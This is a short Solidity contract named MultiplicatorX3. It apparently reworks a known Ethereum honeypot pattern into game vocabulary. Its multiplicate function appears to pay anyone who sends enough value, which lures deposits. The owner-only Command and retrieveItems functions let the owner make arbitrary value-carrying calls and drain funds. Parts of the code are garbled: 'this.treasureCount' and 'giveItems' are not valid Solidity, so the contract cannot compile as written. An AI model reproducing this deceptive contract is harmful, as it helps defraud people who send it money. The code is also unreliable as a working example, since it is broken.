pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    address public RealmLord = msg.sender;

    function() public payable{}

    function retrieveItems()
    payable
    public
    {
        require(msg.sender == RealmLord);
        RealmLord.giveItems(this.treasureCount);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == RealmLord);
        adr.call.value(msg.value)(data);
    }

    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=this.treasureCount)
        {
            adr.giveItems(this.treasureCount+msg.value);
        }
    }
}